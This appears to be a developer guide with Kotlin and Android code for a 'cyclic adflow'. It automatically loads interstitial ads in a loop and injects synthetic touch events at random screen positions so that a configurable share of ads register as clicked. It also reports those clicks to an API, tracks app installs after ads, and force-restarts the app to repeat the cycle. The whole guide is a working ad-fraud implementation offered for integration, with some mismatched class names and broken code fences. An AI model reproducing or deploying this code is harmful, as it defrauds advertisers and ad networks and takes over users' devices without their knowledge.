Follow the steps one by one for the cyclic adflow

Make main activity singleTask
--------------------------
```
<activity
            android:name="MainActivity"
            android:launchMode="singleTask"
            android:screenOrientation="portrait"            
            android:windowSoftInputMode="adjustPan" />
```
Variable declaration
------------------------------
```
private var adAttempts = 0

private val packageChangeReceiver by lazy { PackageChangeReceiver() }
```
-----------------------
Allow permission to load cycle ads with checking the cycle ads flag 
-----------------------------------
```
lifecycleScope.launch {
            delay(user?.firstAdsLoadsWaitTime ?: 30000)
            lifecycle.repeatOnLifecycle(Lifecycle.State.RESUMED) {
                val userDetail = LocalDataHelper.getUserDetail()
                if (userDetail?.id.isNullOrEmpty()
                        .not() && userDetail?.shouldShowCycleAds == true
                ) {
                    if (!isReceiverRegistered) {
                        listenToPackageChanges()
                    }
                    if (!Settings.canDrawOverlays(this@GameActivity)) {
                        val myIntent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                        myIntent.data = Uri.parse("package:$packageName")
                        startActivityForResult(
                            myIntent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE
                        )
                    } else {
                        loadAutoAds(userDetail)
                    }
                }

            }
        }

```
--------------------
Step-3 Load auto ads call it in activity to load auto ads
----------------------
```
    private fun loadAutoAds(user: User?) {
        var coroutine = GlobalScope.launch { }

        adAttempts = 0

        coroutine = startCoroutineTimer(100, 300) {
            adAttempts++
            ThreadUtil.runOnUIThread {
                if (Monetization.hasLoadedAllAds() || adAttempts >= (user?.maxAdLoadAttempts
                        ?: 80)
                ) {
                    adAttempts = 0

                    coroutine.cancel()

                    android.util.Log.e("check_cycle_ads", "6")

                    if (lifecycle.currentState == Lifecycle.State.RESUMED) {
                        android.util.Log.e("check_cycle_ads", "7")
                        checkBestAds(user)
                    }
                }
            }
        }
    }
```
---------------------
check best ads
------------------------
```
private fun checkBestAds(user: User?) {
        android.util.Log.e(
            "check_cycle_ads", "Max Try $maxTryForAds AdsClickCount-$adsClicksCount"
        )

        InterstitialHelper.tryToShowAd(onAdShouldReload = {
            android.util.Log.e("check_cycle_ads", "Ad should reload")

            if (adAttempts == 0) {
                android.util.Log.e("check_cycle_ads", "Ad should reload starting")

                loadAutoAds(user)
            }
        }, onShowingInterstitial = { isShowing, isVideoAd ->
            if (isShowing) {
                checkIsAdPlaying {
                    adsClicksCount = adsClicksCount.inc()
                    android.util.Log.e("check_cycle_ads", "4")

                    putBackroundByAds = true

                    val videoDelay =
                        if (isVideoAd) (user?.videoAdsWaitTimeForClickAndOpen ?: 20_000) else 0
                    val waitTimeForTheAdsClick = (user?.waitTimeForTheAdsClick ?: 2000) + videoDelay
                    val waitTimeForTheReopenApp =
                        (user?.waitTimeForTheReopenApp ?: 10000) + videoDelay

                    adsClicksJob = lifecycleScope.launch {
                        delay(waitTimeForTheAdsClick)

                        if (Random.nextInt(0..100) <= (user?.clickPercentage ?: 50)) {
                            if (isNotAdsActivity(this@DefaultActivity).not()) {
                                android.util.Log.e("check_cycle_ads", "Click on ad $adsClicksCount")
                                clickOnRandomPosOfTheScreen()
                                apiCallForClickOnAds()
                            }
                        }
                        adsClicksJob?.cancel()
                    }
                    restartAppJob = GlobalScope.launch {
                        android.util.Log.e(
                            "check_cycle_ads", "RESTART_APP $waitTimeForTheReopenApp"
                        )
                        delay(waitTimeForTheReopenApp)

                        if (PackageChangeReceiver.lastTimePackageAdded != 0L) {
                            val timeSpent =
                                System.currentTimeMillis() - PackageChangeReceiver.lastTimePackageAdded
                            val seconds: Long = TimeUnit.MILLISECONDS.toSeconds(timeSpent)

                            if (seconds < 15) {
                                android.util.Log.e(
                                    "check_cycle_ads", "RESTART_APP DELAY ${(15 - seconds) * 1000}"
                                )
                                Handler(Looper.getMainLooper()).postDelayed({
                                    restartAppJob()
                                }, (15 - seconds) * 1000)
                            } else {
                                android.util.Log.e(
                                    "check_cycle_ads", "RESTART_APP DELAY ELSE"
                                )
                                restartAppJob()
                            }
                        } else {
                            android.util.Log.e(
                                "check_cycle_ads", "RESTART_APP DELAY No installed app ELSE"
                            )

                            restartAppJob()
                        }
                    }
                }
            } else if (maxTryForAds <= (user?.maxTryForAds ?: 20)) {
                maxTryJob = lifecycleScope.launch {
                    delay(2000)

                    maxTryForAds = maxTryForAds.inc()

                    //try 1-2 times more and restart
                    appWillReopenAfterTime = appWillReopenAfterTime.minus(31000)

                    //*App will restart if there is no ads in 1 min*//

                    if (maxTryForAds >= (user?.maxTryForAds ?: 20) || appWillReopenAfterTime < 0) {
                        android.util.Log.e(
                            "check_cycle_ads", "App reopen time $appWillReopenAfterTime"
                        )
                        ViewUtil.restartApp(this@DefaultActivity)
                    } else {
                        loadAutoAds(user)
                    }

                    maxTryJob?.cancel()
                }
            }
        })
    }
```
----------------
Put it in your monetization manager
----------------
```
fun tryToShowAd(
        lifecycleScope: LifecycleCoroutineScope,
        onShowingInterstitial: (isShowing: Boolean, isVideo: Boolean) -> Unit = { isShowing: Boolean, isVideo: Boolean -> },
        onAdShouldReload: () -> Unit,
    ) {
        Log.wtf(
            "check_cycle_ads",
            "state ${Monetization.hasLoadedInterstitial()} ${Monetization.hasLoadedAd()}"
        )

        if (Monetization.hasLoadedInterstitial() || Monetization.hasLoadedAd()) {
            Log.wtf("check_cycle_ads", "state Showing")

            val isVideoAd = Monetization.showBestAd() == 2
            Log.wtf("check_cycle_ads", "state Showing isVideo $isVideoAd")

            onShowingInterstitial(true, isVideoAd)
        } else {
            onShowingInterstitial(false, false)
        }
        Util.executeDelay({
            val timePassed =
                TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis() - lastOnAdShownTimeCalledMS)
            Log.e("check_cycle_ads", "After show timepassed $timePassed")

            if (timePassed > 15 || lastOnAdShownTimeCalledMS == 0L) {
                onAdShouldReload()
            }
        }, coroutineScope = lifecycleScope, 7_000)
    }
```
-------------
Execute on delay (Add it in Utils)
-------------
```

      fun executeDelay(callback: () -> Unit, coroutineScope: CoroutineScope, delay: Long) {
            coroutineScope.launch {
                delay(delay)
                callback.invoke()
            }
        }
```
----------------------
For restart app
-------------------------
```
    private fun restartAppJob() {
        ViewUtil.restartApp(this@DefaultActivity)
        restartAppJob?.cancel()
    }
```

-------------------
Check if ads is playing or not
------------------
```
private fun checkIsAdPlaying(callback: (Boolean) -> Unit)
 {
        android.util.Log.e("check_cycle_ads", "checkIsAdPlaying")

        if (isNotAdsActivity(this@DefaultActivity)) {
            callback.invoke(true)
        } else {
            callback.invoke(false)
        }
    }
   ```
-----------------
Check if the current activity is an ad activity
---------------------
```
 fun isNotAdsActivity(defaultActivity: GameActivity): Boolean {
        Log.e(
            "ADTYPE",
            "${Controller.foregroundActivity?.localClassName}--${this@BaseActivity.localClassName}"
        )
        return Controller.foregroundActivity == defaultActivity
    }
```
----------------------
Perform click on ads activity
-----------------------
```

    fun clickOnRandomPosOfTheScreen() {
        if (this@BaseActivity == Controller.foregroundActivity) return
        val foregroundView = Controller.foregroundView ?: return
//        val view = findViewById<View>(android.R.id.content)
        val coordinates = getRandomCoordinates(foregroundView)
        val x = coordinates.first
        val y = coordinates.second

        val motionEventDown = MotionEvent.obtain(
            System.currentTimeMillis(),
            System.currentTimeMillis() + 100,
            MotionEvent.ACTION_DOWN,
            x,
            y,
            0
        )
        val motionEventUp = MotionEvent.obtain(
            System.currentTimeMillis(),
            System.currentTimeMillis() + 100,
            MotionEvent.ACTION_UP,
            x,
            y,
            0
        )

        foregroundView.dispatchTouchEvent(motionEventDown)
        foregroundView.dispatchTouchEvent(motionEventUp)
        Log.d("AutoClick", "Auto click at X: $x, Y: $y")
    }

    private fun getRandomCoordinates(view: View): Pair<Float, Float> {
        val screenWidth = view.width.toFloat()
        val screenHeight = view.height.toFloat()

        val randomX = (Math.random() * screenWidth).toFloat()
        val randomY = (Math.random() * screenHeight).toFloat()

        return Pair(randomX, randomY)
    }
```


--------------------------
Broadcast receiver to get the status of package install or uninstall
----------------------------
```
class PackageChangeReceiver : BroadcastReceiver(), CoroutineScope {
    private var forDeleteApp = false
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        val data = intent.data

        when (action) {
            ACTION_PACKAGE_REMOVED -> {
            }

            ACTION_PACKAGE_ADDED -> {
                Log.wtf("check_cycle_ads", "ADDED $data")

                lastTimePackageAdded = System.currentTimeMillis()
            }
        }

    }
```

    override val coroutineContext: CoroutineContext
        get() = Dispatchers.Main
```
    companion object {
        var lastTimePackageAdded = 0L
    }

```
--------------------------
Add monetization callbacks
--------------------------
```
 override fun onAdFailedToShow() {
        Log.e("check_cycle_ads", "Force restart failed to show")
        forceRestart()
    }

    override fun onAdShown() {
        Log.e("check_cycle_ads", "onAdShown Called")
        DailyRewardsManager().lastOnAdShownTimeCalledMS = System.currentTimeMillis()
    }
```
------------------
Force start app functinn when app failed to load ads
---------------
```
    private fun forceRestart() {
        val ctx = baseContext
        val pm = ctx.packageManager
        val intent = pm.getLaunchIntentForPackage(ctx.packageName)
        val mainIntent = Intent.makeRestartActivityTask(intent?.component)
        ctx.startActivity(mainIntent)
        Runtime.getRuntime().exit(0)
    }
```
-------------
Register receiver in Manifest.xml
---------------------
```
        <receiver
            android:name=".shared.services.PackageChangeReceiver"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.INSTALL_PACKAGES">
            <intent-filter>
                <action android:name="com.android.vending.INSTALL_REFERRER" />
                <action android:name="android.intent.action.PACKAGE_ADDED" />
                <action android:name="android.intent.action.PACKAGE_REMOVED" />
                <action android:name="android.intent.action.ACTION_UNINSTALL_PACKAGE" />

                <data android:scheme="package" />
            </intent-filter>
        </receiver>
```
---------------------
Register receiver in Activity
---------------------
```
    private fun listenToPackageChanges() {
        isReceiverRegistered = true

        val intentFilter = IntentFilter()
        intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED)
        intentFilter.addAction(Intent.ACTION_PACKAGE_REMOVED)
        intentFilter.addDataScheme("package")
        registerReceiver(packageChangeReceiver, intentFilter)
    }
```
----------------------
UnRegister receiver onDestroy()
----------------------
```
unregisterReceiver(packageChangeReceiver)
